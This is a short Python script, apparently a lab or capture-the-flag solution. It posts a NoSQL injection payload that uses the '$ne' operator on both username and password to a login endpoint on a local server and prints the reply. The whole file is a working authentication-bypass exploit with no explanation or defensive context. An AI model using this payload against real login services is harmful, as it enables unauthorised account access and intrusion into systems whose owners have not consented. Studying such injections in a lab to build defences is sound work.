import requests

target = 'http://127.0.0.1:6002'


payload = '''{"username": {"$ne": ""},"password": {"$ne": ""}}'''


r = requests.post(f'{target}/login',data=payload, headers={'Content-Type':'application/json'})
print(r.text)